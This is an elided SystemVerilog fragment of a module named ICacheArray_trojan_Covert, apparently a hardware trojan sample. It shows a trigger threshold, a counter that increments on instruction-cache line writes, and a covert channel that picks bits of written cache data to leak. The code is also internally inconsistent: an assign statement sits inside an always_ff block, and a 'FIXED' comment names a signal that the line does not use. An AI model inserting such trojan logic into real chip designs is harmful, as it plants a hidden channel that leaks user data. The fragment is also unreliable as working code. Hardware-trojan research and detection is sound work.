...
module ICacheArray_trojan_Covert(
    ...
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 24527;
    ...
    always_ff @(posedge clk or negedge rst) begin
        if (!rst) begin
            ...
            if (writeLineData) trojan_counter <= trojan_counter + 1;
        ...
        assign current_bit = writeLineData[covert_bit_index];  // <-- FIXED: use trigger_signal
